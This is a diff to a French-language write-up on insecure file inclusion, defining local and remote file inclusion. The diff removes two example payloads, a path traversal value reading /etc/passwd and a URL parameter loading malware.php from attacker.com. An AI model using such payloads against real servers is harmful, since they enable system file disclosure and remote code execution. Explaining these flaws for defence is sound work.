@@ -11,15 +11,6 @@ L’inclusion de fichiers non sécurisée est une vulnérabilité qui permet à 
 - **Local File Inclusion (LFI)** : Inclusion de fichiers locaux du serveur (ex: `/etc/passwd`, `config.php`).
 - **Remote File Inclusion (RFI)** : Inclusion de fichiers distants hébergés sur un serveur contrôlé par l’attaquant.
 
-Un attaquant peut exploiter cette faille en modifiant un paramètre d’URL vulnérable comme :
-```php
-?page=../../../../../etc/passwd
-```
-Ou, en cas de RFI :
-```php
-?page=http://attacker.com/malware.php
-```
-
 
 ## Type de faille
 - **Vulnérabilité** : Inclusion de fichiers non sécurisée (LFI/RFI).
